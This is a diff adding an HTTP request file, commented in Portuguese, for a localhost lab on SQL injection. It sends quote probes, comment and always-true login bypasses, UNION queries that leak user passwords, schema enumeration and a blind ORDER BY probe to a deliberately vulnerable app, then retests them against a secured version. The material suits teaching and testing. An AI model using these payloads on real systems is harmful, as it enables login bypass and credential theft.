@@ -1,0 +1,56 @@
+### ===== Comportamento normal =====
+POST http://localhost:8080/vulneravel/login
+Content-Type: application/json
+
+{"username": "maria", "password": "abc123"}
+
+### ===== Ataque 1: sondagem com aspa =====
+POST http://localhost:8080/vulneravel/login
+Content-Type: application/json
+
+{"username": "'", "password": "x"}
+
+### ===== Ataque 2: bypass com comentário =====
+POST http://localhost:8080/vulneravel/login
+Content-Type: application/json
+
+{"username": "admin'--", "password": "qualquer"}
+
+### ===== Ataque 3: condição sempre verdadeira =====
+POST http://localhost:8080/vulneravel/login
+Content-Type: application/json
+
+{"username": "x", "password": "' OR '1'='1"}
+
+### ===== Ataque 4: UNION (vaza usuários e senhas) =====
+GET http://localhost:8080/vulneravel/produtos?busca=zzz' UNION SELECT id, name, password FROM users --
+
+### ===== Ataque 4b: descobrir tabelas/colunas =====
+GET http://localhost:8080/vulneravel/produtos?busca=zzz' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='PUBLIC' --
+
+### ===== Ataque 5: ORDER BY blind =====
+GET http://localhost:8080/vulneravel/produtos?ordenar=CASE WHEN (SELECT COUNT(*) FROM users WHERE name='admin')>0 THEN -id ELSE id END
+
+
+### ############ RETESTE na versão SEGURA ############
+
+### Uso legítimo
+POST http://localhost:8080/seguro/login
+Content-Type: application/json
+
+{"username": "maria", "password": "abc123"}
+
+### Bypass (deve dar 401)
+POST http://localhost:8080/seguro/login
+Content-Type: application/json
+
+{"username": "admin'--", "password": "qualquer"}
+
+### UNION (deve retornar lista vazia)
+GET http://localhost:8080/seguro/produtos?busca=zzz' UNION SELECT id, name, password FROM users --
+
+### ORDER BY malicioso (ignorado pela allowlist)
+GET http://localhost:8080/seguro/produtos?ordenar=CASE WHEN (SELECT COUNT(*) FROM users WHERE name='admin')>0 THEN -id ELSE id END
+
+### Ordenação válida
+GET http://localhost:8080/seguro/produtos?ordenar=nome
